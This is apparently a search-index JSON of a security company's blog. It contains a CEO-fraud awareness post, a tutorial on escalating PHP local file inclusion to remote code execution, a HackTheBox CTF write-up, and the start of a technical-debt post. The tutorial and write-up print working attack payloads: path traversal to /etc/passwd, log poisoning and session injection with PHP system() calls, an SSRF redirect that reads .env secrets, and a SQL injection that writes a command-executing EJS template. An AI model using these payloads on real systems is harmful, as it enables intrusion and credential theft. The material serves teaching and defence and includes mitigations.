{"config":{"lang":["en","es"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Atlansec","text":"<p>Welcome to Material for MkDocs.</p>"},{"location":"blog/","title":"Welcome to our Blog","text":""},{"location":"blog/posts/02-02-2025/","title":"The Costly Lesson of CEO Fraud: Why Employee Cybersecurity Training is Crucial","text":"<p>January 16, 2016 \u2013 Ried im Innkreis, Austria. At the offices of FACC Operations GmbH (an Austrian manufacturer of aerospace components), an employee from the finance department received an urgent email that appeared to come directly from the company\u2019s CEO.</p> <p>The request was clear: a million-euro transfer was needed to finalize a \"strategic project\".</p> <p>Under pressure due to the \"confidential\" nature of the request and the authority of the sender, the employee proceeded with the transaction without verifying its legitimacy.</p> <p>A few days later, FACC discovered it had been scammed. The email had not come from the real CEO but from cybercriminals who had forged his identity. As a result, the company lost approximately 42 million euros in a single bank transfer. </p> <p>This case shows how lack of cybersecurity awareness and training can lead to massive financial losses, not necessarily due to technical failures or software vulnerabilities, but rather the human factor.</p>","tags":["Cybersecurity","CEO Fraud","BEC","Employee Training","Phishing","Social Engineering","Cyber Awareness","Corporate Security"]},{"location":"blog/posts/02-02-2025/#why-invest-resources-in-employee-training","title":"Why Invest Resources in Employee Training?","text":"<ul> <li>The Most Vulnerable Link</li> </ul> <p>Even if you have state-of-the-art technological measures, if staff aren\u2019t vigilant, employees become the easiest entry point for attackers.</p> <ul> <li>Social Engineering and Manipulation</li> </ul> <p>Phishing and BEC attacks exploit trust and authority rather than hacking technical vulnerabilities.</p> <ul> <li>Economic and Reputational Consequences</li> </ul> <p>A single fraudulent transaction can cause multi-million-euro losses and irreparable damage to a company's reputation.</p> <ul> <li>False Sense of Security</li> </ul> <p>Thinking, \"This won't happen to us\", is a serious mistake. Cybercriminals continuously refine their methods, targeting organizations of all sizes.</p>","tags":["Cybersecurity","CEO Fraud","BEC","Employee Training","Phishing","Social Engineering","Cyber Awareness","Corporate Security"]},{"location":"blog/posts/02-02-2025/#how-can-we-prevent-these-situations","title":"How Can We Prevent These Situations?","text":"<ul> <li>Continuous Training</li> </ul> <p>Organize workshops, webinars, and phishing or BEC attack simulations. Teach employees to spot suspicious emails, slightly altered sender addresses, and exaggerated urgency or confidentiality tactics.</p> <ul> <li>Internal Verification Policies</li> </ul> <p>Establish protocols that require phone or in-person confirmation for high-value transfers. Demand dual approval or signatures from multiple executives for large financial transactions.</p> <ul> <li>Multi-Factor Authentication (MFA)</li> </ul> <p>A username and password alone are not enough. Two-step or multi-step verification (one-time  codes, authentication apps, physical tokens) makes unauthorized access more difficult, especially when credentials are compromised through phishing.</p> <ul> <li>Culture of \u201cConstructive Distrust\u201d</li> </ul> <p>Encourage employees to report or question the legitimacy of an email whenever in doubt, without fear of repercussions. Create clear channels of communication to quickly report anomalies.</p>","tags":["Cybersecurity","CEO Fraud","BEC","Employee Training","Phishing","Social Engineering","Cyber Awareness","Corporate Security"]},{"location":"blog/posts/02-02-2025/#conclusions","title":"Conclusions","text":"<p>The FACC case proves that a single human lapse can cause millions in losses and severe reputational damage. There was no malware, no network breach\u2014just a well-crafted email that exploited human trust.</p> <p>Cybersecurity is not just about firewalls and antivirus software\u2014it\u2019s about building a security-first culture through training, awareness, and strict protocols. When every employee understands the risks and knows how to respond, the human factor transforms from the weakest link into the first line of defence.</p> <p>Regular phishing simulations are essential for strengthening a company's cybersecurity posture. Cybercriminals continuously refine their tactics, making employees the first line of defence against attacks like Business Email Compromise (BEC) and credential theft. By conducting periodic phishing tests, organizations can reinforce security awareness, and train staff to recognize and report suspicious emails. This proactive approach reduces human error, minimizes financial and reputational risks, and fosters a security-conscious culture within the company.</p>","tags":["Cybersecurity","CEO Fraud","BEC","Employee Training","Phishing","Social Engineering","Cyber Awareness","Corporate Security"]},{"location":"blog/posts/02-02-2025/#other-cases","title":"Other Cases","text":"","tags":["Cybersecurity","CEO Fraud","BEC","Employee Training","Phishing","Social Engineering","Cyber Awareness","Corporate Security"]},{"location":"blog/posts/02-02-2025/#google-and-facebook","title":"Google and Facebook","text":"<p>A Lithuanian scammer sent fraudulent emails for several years, posing as a hardware supplier. Both Google and Facebook transferred funds totalling over $100 million. Read more on BBC | Read more on CNBC</p>","tags":["Cybersecurity","CEO Fraud","BEC","Employee Training","Phishing","Social Engineering","Cyber Awareness","Corporate Security"]},{"location":"blog/posts/02-02-2025/#toyota-boshoku","title":"Toyota Boshoku","text":"<p>A Toyota subsidiary transferred approximately $37 million to cybercriminals after receiving genuine-looking fraudulent emails disguised as supplier communications.  </p> <p>Read more on Tripwire</p>","tags":["Cybersecurity","CEO Fraud","BEC","Employee Training","Phishing","Social Engineering","Cyber Awareness","Corporate Security"]},{"location":"blog/posts/02-02-2025/#crelan-bank","title":"Crelan Bank","text":"<p>Belgium\u2019s Crelan Bank lost \u20ac70 million in a Business Email Compromise (BEC) attack, where cybercriminals posed as high-ranking executives to request transfers.  </p> <p>Read more on Help Net Security</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Cybersecurity","CEO Fraud","BEC","Employee Training","Phishing","Social Engineering","Cyber Awareness","Corporate Security"]},{"location":"blog/posts/06-04-2025/","title":"LFI Uncovered: From Local File Inclusion to Remote Code Execution (RCE)","text":"<p>The Local File Inclusion (LFI) vulnerability is not limited to merely including local files. In the hands of a skilled attacker, it can become a critical attack vector, escalating to a situation of Remote Code Execution (RCE). This article explores how attackers exploit this vulnerability to compromise servers and what measures you can implement to protect your application and infrastructure.</p>","tags":["Web Security","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"blog/posts/06-04-2025/#what-is-local-file-inclusion-lfi","title":"What is Local File Inclusion (LFI)?","text":"<p>The Local File Inclusion (LFI) vulnerability occurs when a web server includes local files based on user-provided input. This behavior can be exploited to read files that are not accessible from the client side and cause unexpected behaviors in the application.</p>","tags":["Web Security","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"blog/posts/06-04-2025/#impact-of-lfi","title":"Impact of LFI","text":"<p>LFI vulnerabilities can lead to severe security issues on a web server, including:</p> <ul> <li>Unauthorized Access to Sensitive Files and Data Theft: An attacker can read configuration files and stored credentials on the system.</li> <li>Execution of Malicious Code: Through advanced techniques, an attacker could execute arbitrary code within the server's context.</li> </ul>","tags":["Web Security","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"blog/posts/06-04-2025/#basic-lfi-example","title":"Basic LFI Example","text":"<p>Imagine a web application developed in PHP:</p> Web Application. <p>We have a search bar where we can look for any file. The web application might use code similar to this:</p> <pre><code>&lt;?php\n  $file = $_GET['file'];\n  if (isset($file)){\n    include($file);\n  }\n?&gt;\n</code></pre> <p>This code expects a <code>file</code> parameter containing the file we pass to the search form. If we input a file like <code>hi.php</code>, the variable will hold that string, referencing the <code>hi.php</code> file in the same directory as the web application file.</p> <p>If we perform the search, the URL of our web app will change to:</p> <pre><code>http://domain.com/tests/index.php?file=hi.php\n</code></pre> Result of applying basic LFI. <p>As a proof of concept, we attempt to access the file containing user configuration on Linux systems, the <code>/etc/passwd</code> file. Since the <code>file</code> parameter input is not sanitized, an attacker could write the following in the web application URL:</p> <pre><code>http://domain.com/tests/index.php?file=/etc/passwd\n</code></pre> Accessing the /etc/passwd file. <p>This represents a severe security flaw, not only due to the disclosure of usernames and internal server information but also because the attacker could access other system files, such as service configurations, command history, or SSH keys.</p> <p>To prevent this, we could sanitize the input received by the <code>file</code> parameter:</p> <pre><code>&lt;?php\n  $file = $_GET['file'];\n  if (isset($file)){\n    include(\"/var/www/html\" . $file);\n  }\n?&gt;\n</code></pre> Restricted access to /etc/passwd. <p>With this change, access to files outside the <code>/var/www/html</code> path is restricted, slightly increasing the security of our server. However, this mitigation is not complete, as there are other techniques to bypass this type of mitigation, as we will see below.</p>","tags":["Web Security","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"blog/posts/06-04-2025/#lfi-with-path-traversal","title":"LFI with Path Traversal","text":"<p>Now, consider a more robust web application where basic LFI payloads do not work because the web contains this code:</p> <pre><code>&lt;?php\n  $file = $_GET['file'];\n  if (isset($file)){\n    include(\"/var/www/html\". $file);\n  }\n?&gt;\n</code></pre> <p>This protection prevents access to any file outside the specified directory. However, this restriction can be bypassed using Path Traversal.</p> <p>Path Traversal, also known as Directory Traversal, is a technique to access files and directories outside the directory allowed by the web application. It is achieved using sequences like <code>../</code> to move up levels in the file system.</p> <p>If an application has a filter that only restricts files in its working directory, Path Traversal combined with LFI can be used to access system files. For example:</p> <pre><code>https://domain.com/tests/index.php?file=../../../../../../../../../../../etc/passwd\n</code></pre> Accessing the server's /etc/passwd file. <p>This type of attack is highly dangerous when combined with LFI, as it can allow an attacker to access critical system files, including configurations, credentials, and server activity logs. Additionally, these attacks are often escalated to remote code execution, either by performing a <code>LogPoisoning</code> attack or including a <code>Web Shell</code> on the server.</p>","tags":["Web Security","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"blog/posts/06-04-2025/#from-lfi-to-rce-remote-code-execution","title":"From LFI to RCE (Remote Code Execution)","text":"<p>The transition from a Local File Inclusion (LFI) vulnerability to Remote Code Execution (RCE) is an advanced technique attackers can use to fully compromise a system. These methods are highly dependent on the language in which the application is written and specific server configurations. The most common methods to escalate from LFI to RCE include:</p>","tags":["Web Security","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"blog/posts/06-04-2025/#including-log-files-with-code-injection-log-poisoning","title":"Including Log Files with Code Injection (Log Poisoning)","text":"<p>If the web server logs requests in accessible log files, an attacker can inject malicious code into those logs and then include them via LFI. For example:</p> <ol> <li>The attacker sends a malicious request that injects PHP code into the server logs:</li> </ol> <pre><code>curl -A \"&lt;?php system('whoami'); ?&gt;\" http://domain.com\n</code></pre> <p>Here, the PHP code is injected into the web server's log file (e.g., <code>/var/log/apache2/access.log</code>).</p> <ol> <li>Then, they use LFI to include the log file:</li> </ol> <pre><code>http://domain.com/tests/index.php?file=../../../../../../var/log/apache2/access.log\n</code></pre> <p>This executes the injected PHP code, allowing the attacker to execute commands on the server.</p> Accessing Apache access logs via LFI. <p>As seen at the end of the log, it reflects that we accessed the specified directory. This means the content of the variable provided in the URL has been processed by the server, allowing the attacker to view sensitive information or execute malicious code if the included file contains executable instructions.</p> <p>Similarly, depending on the log file that can be accessed, code can be injected into web service logs (via the User-Agent, for example), SSH logs (via the username), or even custom application logs through various parameters.</p>","tags":["Web Security","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"blog/posts/06-04-2025/#what-exactly-happens","title":"What Exactly Happens?","text":"<ul> <li>PHP uses <code>include()</code> to interpret the specified file.</li> <li>When the log is included, it encounters a line containing <code>&lt;?php system('id'); ?&gt;</code>.</li> <li>PHP executes that line as if it were part of the original code.</li> <li>The result of the <code>id</code> command is displayed in the HTTP response.</li> </ul>","tags":["Web Security","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"blog/posts/06-04-2025/#including-php-sessions","title":"Including PHP Sessions","text":"<p>When PHP stores session data in files (default configuration), these are saved in a directory defined by <code>session.save_path</code> in the <code>php.ini</code> file. If an attacker gains access to these files via Local File Inclusion (LFI), they can inject and execute malicious code.</p>","tags":["Web Security","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"blog/posts/06-04-2025/#attack-flow","title":"Attack Flow","text":"<ol> <li>Injecting Code into the Session:     The attacker starts a session and modifies its content to include PHP code:</li> </ol> <pre><code>&lt;?php\n session_start();\n $_SESSION['malicious'] = \"&lt;?php system('id'); ?&gt;\";\n?&gt;\n</code></pre> <p>This saves the payload in the session file (e.g., <code>/var/lib/php/sessions/sess_abc123</code>).</p> <ol> <li>Exploitation via LFI:     If the server allows including files outside the root directory: <code>url     http://domain.com/index.php?file=../../../../var/lib/php/sessions/sess_abc123</code>    The injected PHP code will execute, allowing commands like <code>id</code> to run.</li> </ol>","tags":["Web Security","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"blog/posts/06-04-2025/#why-are-session-files-sensitive","title":"Why Are Session Files Sensitive?","text":"<ul> <li>Accessible Location: By default, PHP stores sessions in directories like <code>/var/lib/php/sessions</code> (Linux) or <code>C:\\Windows\\Temp</code> (Windows). If these files are within the web server's reach (e.g., <code>DocumentRoot</code>), they could be included via LFI.</li> <li>Storage Format: Session files contain plaintext data. If the value includes unsanitized PHP code, it will execute when included.</li> </ul>","tags":["Web Security","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"blog/posts/06-04-2025/#mitigations","title":"Mitigations","text":"<p>Preventing vulnerabilities like Local File Inclusion (LFI) requires a comprehensive approach combining secure development practices, server configurations, and constant monitoring. Mitigations should not only focus on preventing initial exploitation but also on limiting the impact of a potential attack. Below are key strategies to protect your applications and systems against LFI, its potential escalation to Remote Code Execution (RCE), and the inclusion of PHP sessions.</p>","tags":["Web Security","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"blog/posts/06-04-2025/#mitigations-to-prevent-lfi-to-rce","title":"Mitigations to Prevent LFI to RCE","text":"<p>To prevent an LFI vulnerability from escalating to RCE, the following measures should be implemented:</p> <ol> <li> <p>Strict Input Validation:</p> <p>Use whitelists to limit the files that can be included, and reject characters like <code>../</code> and others that enable Path Traversal.</p> <ul> <li> <p>Whitelists:</p> </li> <li> <p>Concept: Allow only a specific set of files or paths considered safe.</p> </li> <li>Example: If your application needs to include only <code>.php</code> files from a specific directory, define a whitelist that permits only those files.</li> </ul> <pre><code>&lt;?php\n$allowed_files = [\n    'home.php',\n    'about.php',\n    'contact.php'\n];\n\n$file = $_GET['file'];\n\nif (in_array($file, $allowed_files)) {\n    include('/var/www/html/pages/' . $file);\n} else {\n    echo \"File not allowed.\";\n}\n?&gt;\n</code></pre> <p>In this example, only the files <code>home.php</code>, <code>about.php</code>, and <code>contact.php</code> can be included. Any other file will be rejected.</p> <ul> <li> <p>Reject Dangerous Characters:</p> </li> <li> <p>Concept: Block characters and sequences that facilitate Path Traversal and other manipulations.</p> </li> <li>Example: Remove or reject sequences like <code>../</code>, <code>..\\\\</code>, and other special characters.</li> </ul> <pre><code>&lt;?php\nfunction sanitizePath($input) {\n    // Decode URL first to prevent bypass with encoded characters\n    $input = urldecode($input);\n\n    // Remove traversal sequences in all their variants\n    $input = str_replace(['../', '..\\\\', '.../', '....//'], '', $input);\n\n    // Remove disallowed characters (only letters, numbers, dashes, and dots)\n    $input = preg_replace('/[^a-zA-Z0-9\\-\\.\\/]/', '', $input);\n\n    return $input;\n}\n\n$file = sanitizePath($_GET['file']);\n$basePath = '/var/www/html/pages/';\n$fullPath = realpath($basePath . $file . '.php');\n\n// Final validation with realpath()\nif ($fullPath &amp;&amp; strpos($fullPath, $basePath) === 0) {\n    include($fullPath);\n} else {\n    echo \"Access denied: Invalid path.\";\n}\n?&gt;\n</code></pre> <p>Combining proactive sanitization, strict character validation, and <code>realpath()</code> checks closes multiple attack vectors. However, whitelists remain the most robust strategy against LFI.</p> </li> <li> <p>Disable Dangerous Functions:</p> <p>Configure <code>allow_url_include=Off</code> and <code>allow_url_fopen=Off</code> in <code>php.ini</code> and disable functions like <code>system()</code>, <code>exec()</code>, <code>shell_exec()</code>, and similar.</p> <ul> <li> <p><code>allow_url_include</code> and <code>allow_url_fopen</code>:</p> </li> <li> <p>Concept: These directives allow including files from remote URLs. Disabling them prevents code inclusion from external sources, reducing the risk of RCE.</p> </li> <li> <p>Configuration: In the <code>php.ini</code> file, ensure they are set to <code>Off</code>:</p> <pre><code>allow_url_include = Off\nallow_url_fopen = Off\n</code></pre> </li> <li> <p>Disable Critical Functions:</p> <ul> <li>Concept: Functions like <code>system()</code>, <code>exec()</code>, <code>shell_exec()</code>, <code>passthru()</code>, and <code>popen()</code> allow executing system commands. Disabling or restricting their use prevents attackers from executing arbitrary code.</li> <li>Configuration: In the <code>php.ini</code> file, use the <code>disable_functions</code> directive:</li> </ul> <pre><code>disable_functions = system,exec,shell_exec,passthru,popen,proc_open,curl_exec,curl_multi_exec,parse_ini_file,show_source\n</code></pre> <p>This disables the listed functions, preventing their use in PHP code.</p> </li> </ul> </li> <li> <p>Isolate Sensitive Files:</p> <p>Store configuration files, logs, and sessions outside the directory accessible by the web application.</p> <ul> <li>Concept: Store configuration files, logs, and sessions outside the web-accessible root directory.</li> <li> <p>Example:</p> </li> <li> <p>Logs: Save log files in a directory like <code>/var/log/app/</code> that is not directly accessible via the web.</p> </li> <li>Configuration: Store configuration files in a directory like <code>/etc/app/</code> and ensure the web server user does not have read permissions.</li> <li>Sessions: Configure PHP to save sessions in a secure directory outside the web server's reach, such as <code>/var/lib/php/sessions/</code>.</li> </ul> <p>In the <code>php.ini</code> file:</p> <pre><code>session.save_path = \"/var/lib/php/sessions\"\n</code></pre> <p>Ensure only the system user has access to this directory.</p> </li> <li> <p>Set Proper Permissions:</p> <p>Restrict read and write permissions on critical files and directories.</p> <ul> <li>Concept: Restrict read and write permissions on critical files and directories.</li> <li> <p>Example:</p> </li> <li> <p>Use <code>chmod</code> to set file permissions. For example, for a configuration file:</p> <pre><code>chmod 600 /etc/app/config.ini\nchown root:root /etc/app/config.ini\n</code></pre> <p>This grants read and write permissions only to the root user.</p> </li> <li> <p>Directories:</p> <pre><code>chmod 700 /var/log/app/\nchown www-data:www-data /var/log/app/\n</code></pre> <p>This grants read, write, and execute permissions to the <code>www-data</code> user (the web server user) and restricts access to others.</p> </li> </ul> </li> <li> <p>Monitor and Audit:</p> <p>Regularly review server logs for suspicious activity and implement intrusion detection systems (IDS) to identify exploitation attempts.</p> <ul> <li> <p>Review Server Logs:</p> </li> <li> <p>Concept: Regularly analyze web server and application logs for suspicious patterns, unusual errors, or attempts to access unauthorized files.</p> </li> <li> <p>Example: Look for patterns in logs such as:</p> <ul> <li>Attempts to access sensitive files (<code>/etc/passwd</code>, configuration files).</li> <li>File inclusion errors.</li> <li>Requests with suspicious characters (<code>../</code>).</li> </ul> </li> <li> <p>Implement a WAF (Web Application Firewall):</p> </li> <li> <p>Concept: Use a web application firewall (WAF) to protect exposed applications from attacks like Path Traversal, code injection, and other common threats.</p> </li> <li>Example: Configure a WAF like ModSecurity or cloud-based services like Cloudflare to filter and block malicious requests.</li> </ul> <p>These tools are ideal for protecting web applications in internet-exposed environments, providing an additional layer of security.</p> </li> </ol>","tags":["Web Security","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"blog/posts/06-04-2025/#mitigations-to-prevent-php-session-inclusion","title":"Mitigations to Prevent PHP Session Inclusion","text":"<ol> <li>Move Session Files Outside the Web Server's Reach:    Configure <code>session.save_path</code> in <code>php.ini</code> to use a directory not accessible from the web:</li> </ol> <pre><code>session.save_path = \"/var/secure/sessions\"\n</code></pre> <p>Ensure permissions: <code>chmod 600 /var/secure/sessions</code>.</p> <ol> <li>Strict Validation in LFI:    Use whitelists and path sanitization:</li> </ol> <pre><code>$allowed = ['home', 'about'];\nif (!in_array($_GET['file'], $allowed)) die(\"Access denied\");\n</code></pre> <ol> <li>Sanitize Session Data:    Validate and filter inputs before storing them in <code>$_SESSION</code>:</li> </ol> <pre><code>$_SESSION['user'] = htmlspecialchars($input);\n</code></pre> <ol> <li>Configure <code>open_basedir</code>:    Restrict access to specific directories:</li> </ol> <pre><code>open_basedir = /var/www/html:/var/secure/sessions\n</code></pre> <ol> <li>Use Alternative Storage:    Change the session handler to databases or memory:</li> </ol> <pre><code>ini_set('session.save_handler', 'redis');\nini_set('session.save_path', 'tcp://127.0.0.1:6379');\n</code></pre>","tags":["Web Security","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"blog/posts/06-04-2025/#conclusion","title":"Conclusion","text":"<p>The Local File Inclusion (LFI) vulnerability serves as a reminder of how poor user input management can become a critical attack vector. While it may seem like a minor flaw, its combination with advanced techniques like Path Traversal or Log Poisoning can quickly escalate to Remote Code Execution (RCE), completely compromising a system's security.</p> <p>The key to mitigating such vulnerabilities lies in implementing secure development practices, such as strict input validation, the use of whitelists, proper server configuration, and disabling dangerous functions. Additionally, constant monitoring and auditing of systems are essential to detect and prevent exploitation attempts.</p> <p>Ultimately, security is not a state but a continuous process. Adopting a proactive approach and maintaining a mindset of constant improvement is crucial to protecting your applications and infrastructure against threats like LFI.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Web Security","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"blog/posts/08-12-2024/","title":"Challenge, Train, Flag: Blueprint Heist","text":"<p>At Atlansec, we are committed to CTFs as a key learning tool under the learning by doing methodology. We believe that facing practical challenges is the best way to develop technical skills and foster creativity. With this section we want to spread the value of CTFs, share writeups of challenges of a certain technical complexity and bring the community closer to a practical and technical approach to learning.</p>","tags":["Cybersecurity","Pentesting","CTF","Code Review","SSRF","JWT","SQL Injection","WebSecurity","HackTheBox","NodeJS"]},{"location":"blog/posts/08-12-2024/#what-is-a-ctf","title":"What is a CTF?","text":"<p>Capture the Flag (CTF) competitions are cybersecurity challenges where participants tackle a variety of technical problems to find \"flags\", which are hidden markers proving successful completion of a task. CTFs simulate real-world scenarios in areas like cryptography, reverse engineering, web security, forensics, and binary exploitation, helping participants build essential cybersecurity skills.</p> <p>CTFs aren't just competitions; they are a gateway to learning by solving. They teach participants how to think critically, debug complex systems, and adapt under pressure. Each challenge is a story, a puzzle, and a lesson rolled into one.</p> <p>In this series, we'll explore notable CTF challenges, dive into their technical solutions, and highlight the skills they develop. Welcome to Challenge, Train, Flag!</p>","tags":["Cybersecurity","Pentesting","CTF","Code Review","SSRF","JWT","SQL Injection","WebSecurity","HackTheBox","NodeJS"]},{"location":"blog/posts/08-12-2024/#key-concepts","title":"Key concepts","text":"<ul> <li> <p>SSRF (Server-Side Request Forgery): Technique that allows an attacker to force a server to make HTTP requests on their behalf. Depending on the context, it can be quite critical as it can allow an attacker to access resources within the target's internal network.</p> </li> <li> <p>JSON Web Token (JWT): An open standard for authenticating and securely transferring information using a token.</p> </li> <li> <p>SQL Injection: An attack that allows malicious SQL code to be injected into a query to manipulate the database query.</p> </li> <li> <p>wkhtmltopdf: Library for converting web content (HTML) to PDF.</p> </li> </ul>","tags":["Cybersecurity","Pentesting","CTF","Code Review","SSRF","JWT","SQL Injection","WebSecurity","HackTheBox","NodeJS"]},{"location":"blog/posts/08-12-2024/#the-challenge","title":"The challenge","text":"<p>This time we bring you a challenge from the HTB Business CTF 2024. The challenge is from the web category and although it is listed as easy on the HackTheBox platform, it is one of the most complex web challenges on the platform due to the number of steps that make up the solution.</p> <p>In this challenge we are given the source code of a NodeJS application and access to a web service running the application.</p>","tags":["Cybersecurity","Pentesting","CTF","Code Review","SSRF","JWT","SQL Injection","WebSecurity","HackTheBox","NodeJS"]},{"location":"blog/posts/08-12-2024/#understanding-the-application-logic","title":"Understanding the Application Logic","text":"<p>The challenge starts with access to an application of the urban planning commission. When browsing, we notice that clicking on any of the links generates a POST request to the /download path. Let's review its implementation in the routes file:</p> <pre><code>router.post(\"/download\", authMiddleware(\"guest\"), (req, res, next) =&gt; {\n    convertPdf(req, res, next);\n});\n</code></pre> <p>Here we can see that the convertPdf function is responsible for handling the logic of this path. Let's go on to examine its code:</p> <pre><code>async function convertPdf(req, res, next) {\n    try {\n        const { url } = req.body;\n\n        if (!isUrl(url)) {\n            return next(generateError(400, \"Invalid URL\"));\n        }\n\n        const pdfPath = await generatePdf(url);\n        res.sendFile(pdfPath, { root: \".\" });\n    } catch (error) {\n        return next(generateError(500, error.message));\n    }\n}\n</code></pre> <p>After reading this, we can see that the function makes sure that the parameter it receives is a valid URL before passing it to the generatePdf function. Let's look at the latter next:</p> <pre><code>async function generatePdf(urls) {\n    const pdfFilename = generateRandomFilename();\n    const pdfPath = `uploads/${pdfFilename}`;\n\n    try {\n        await generatePdfFromUrl(urls, pdfPath);\n        return pdfPath;\n    } catch (error) {\n        throw new Error(`Error generating PDF: ${error.stack}`);\n    }\n}\n\nasync function generatePdfFromUrl(url, pdfPath) {\n    return new Promise((resolve, reject) =&gt; {\n        wkhtmltopdf(url, { output: pdfPath }, (err) =&gt; {\n            if (err) {\n                reject(err);\n            } else {\n                resolve();\n            }\n        });\n    });\n}\n</code></pre> <p>We note that the generatePdfFromUrl function uses wkhtmltopdf to convert the URL content to a PDF file. This flow opens the door to exploit a SSRF vulnerability in the library.</p>","tags":["Cybersecurity","Pentesting","CTF","Code Review","SSRF","JWT","SQL Injection","WebSecurity","HackTheBox","NodeJS"]},{"location":"blog/posts/08-12-2024/#ssrf-to-local-file-read-on-wkhtmltopdf","title":"SSRF to local file read on wkhtmltopdf","text":"<p>Using an attacker-controlled server, we can serve files on a web server to redirect the visitor to local file system locations, in this case converting the SSRF on the server into a way to read internal files such as /etc/passwd. To do this, we create a PHP file with the following content:</p> <pre><code>&lt;?php header('location:file:///etc/passwd'); ?&gt;\n</code></pre> <p>By passing the URL of our server as a parameter to the /download path, the generated PDF will contain the contents of the /etc/passwd file of the server making the request.</p> Reading /etc/passwd with the PDF generator <p>We then modify the PHP file to exfiltrate the application's .env file:</p> <pre><code>&lt;?php header('location:file:///app/.env'); ?&gt;\n</code></pre> Reading env file with the PDF generator","tags":["Cybersecurity","Pentesting","CTF","Code Review","SSRF","JWT","SQL Injection","WebSecurity","HackTheBox","NodeJS"]},{"location":"blog/posts/08-12-2024/#jwt-forging","title":"JWT Forging","text":"<p>With the key extracted from the .env file, we can sign valid JWT tokens. We use a tool like JWT.io to generate a token with the administrator role:</p> <pre><code>{\n  \"role\": \"admin\"\n}\n\n\n```json\n{\n  \"role\": \"admin\"\n}\n</code></pre> Edit JWT token on JWT.io <p>Using the token we have generated, we will make a request to the internal admin panel endpoint with the following structure:</p> <pre><code>http://127.0.0.1:1337/admin?token=&lt;JWT_admin&gt;\n</code></pre> <p>In the generated PDF we can see the contents of the admin panel.  While this generates a screenshot of the admin panel, it only takes us halfway to our ultimate goal.</p> PDF with the content of the admin panel","tags":["Cybersecurity","Pentesting","CTF","Code Review","SSRF","JWT","SQL Injection","WebSecurity","HackTheBox","NodeJS"]},{"location":"blog/posts/08-12-2024/#sql-injection-to-file-upload","title":"SQL injection to file upload","text":"<p>Analysing the rest of the application code, we discovered that the GraphQL endpoint is vulnerable to SQL injection in the getDataByName query. However, a robust regular expression is used to filter out malicious entries:</p> <pre><code>function detectSqli(query) {\n    const pattern = /^.*[!#$%^&amp;*()\\-_=+{}\\[\\]\\\\|;:'\\\",.&lt;&gt;\\/\\?]/;\n    return pattern.test(query);\n}\n</code></pre> <p>A more detailed analysis shows that the expression is not multiline, which allows us to bypass it with a line break (<code>n</code>).</p> <ul> <li>No line break.</li> </ul> The regex match our payload <ul> <li>With a line break.</li> </ul> The regex doesn\u00b4t match our payload <p>Once this is discovered, we can build a payload for an SQL injection that writes a malicious EJS file to the 404 error path, since the application does not have a path to handle this type of error.</p> <p>The payload we build should be similar to the following, where we include an EJS template that reads the flag by executing the target binary.</p> <pre><code>' UNION SELECT 1, '&lt;p&gt;&lt;%= process.mainModule.require(\"child_process\").execSync(\"/readflag\") %&gt;&lt;/p&gt;', 2, 3 INTO OUTFILE '/app/views/errors/404.ejs'--\n</code></pre> <p>With the malicious file in place, we access a non-existent path to throw a 404 error and execute the /readflag command. This gives us access to the contents of the flag.</p> Reading the flag <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Cybersecurity","Pentesting","CTF","Code Review","SSRF","JWT","SQL Injection","WebSecurity","HackTheBox","NodeJS"]},{"location":"blog/posts/09-02-2025/","title":"Technical Debt: A Necessary Evil in Software Development","text":"<p>At Atlansec, while we are primarily a cybersecurity company, we also address technical debt from the perspective of secure software development and infrastructure security. Building secure code and robust infrastructures is key to reducing vulnerabilities and ensuring long-term maintainability.</p> <p>Technical debt is an inevitable enemy that accompanies all software projects to a greater or lesser extent. However, it is not always harmful and, in some cases, can be a necessary strategy to achieve critical objectives within a given timeframe.</p>","tags":["Software Development","Technical Debt","Code Quality","Software Maintenance","Agile Development","CI/CD","Refactoring","Software Engineering"]},{"location":"blog/posts/09-02-2025/#what-is-technical-debt","title":"What is technical debt?","text":"<p>Technical debt represents the cost of fixing suboptimal or poorly implemented code that results from accelerating development to meet deadlines. It is the price paid when speed is prioritized over software quality.</p> <p>Its origin lies in the need to quickly release new functionalities, often sacrificing fundamental aspects such as maintainability and code clarity. But is it always negative?</p>","tags":["Software Development","Technical Debt","Code Quality","Software Maintenance","Agile Development","CI/CD","Refactoring","Software Engineering"]},{"location":"blog/posts/09-02-2025/#is-technical-debt-inherently-bad","title":"Is technical debt inherently bad?","text":"<p>It depends on the context. Accelerating development in a controlled manner to meet a critical deadline is not the same as writing messy code due to ignorance or lack of good practices.</p> <p>Asana summarizes this concept well into four quadrants of technical debt:</p> Asana tech debt quadrant","tags":["Software Development","Technical Debt","Code Quality","Software Maintenance","Agile Development","CI/CD","Refactoring","Software Engineering"]},{"location":"blog/posts/09-02-2025/#the-4-quadrants-of-technical-debt","title":"The 4 Quadrants of Technical Debt","text":"<ol> <li>Prudent and Deliberate: The conscious decision to implement a quick solution and deal with the consequences later. This type of debt is acceptable when the risk is low, and the advantages of rapid delivery outweigh the disadvantages.</li> <li>Reckless and Deliberate: Having the knowledge and capability to write good code but choosing to prioritize speed without a strategy to mitigate the resulting debt. This approach often leads to long-term problems.</li> <li>Prudent and Inadvertent: Trying to produce the best possible code but later discovering a better solution. In this case, the debt is not due to bad practices but rather the natural learning and evolution of the software.</li> <li>Reckless and Inadvertent: Debt is generated without awareness, either due to ignorance or lack of experience in good development practices. This type of debt is particularly risky as it can accumulate without the team realizing it.</li> </ol>","tags":["Software Development","Technical Debt","Code Quality","Software Maintenance","Agile Development","CI/CD","Refactoring","Software 